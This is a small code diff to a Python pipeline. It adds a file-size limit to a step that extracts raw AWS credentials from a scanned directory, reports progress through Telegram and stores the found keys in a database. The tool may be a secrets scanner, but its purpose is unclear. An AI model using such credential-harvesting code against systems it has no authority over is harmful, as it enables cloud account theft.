@@ -489,7 +489,9 @@ class Pipeline:
             
             # Extract raw credentials and send to Telegram
             await self.notify(job.chat_id,'🔑 Extracting raw AWS credentials…',job.message_id)
-            raw_creds=await asyncio.to_thread(extract_raw_credentials, root, 8, self.s.output_dir)
+            raw_creds=await asyncio.to_thread(
+                extract_raw_credentials, root, 8, self.s.output_dir, self.s.max_scan_file_bytes
+            )
             
             if raw_creds:
                 await asyncio.to_thread(self.db.save_credentials,job.id,raw_creds)
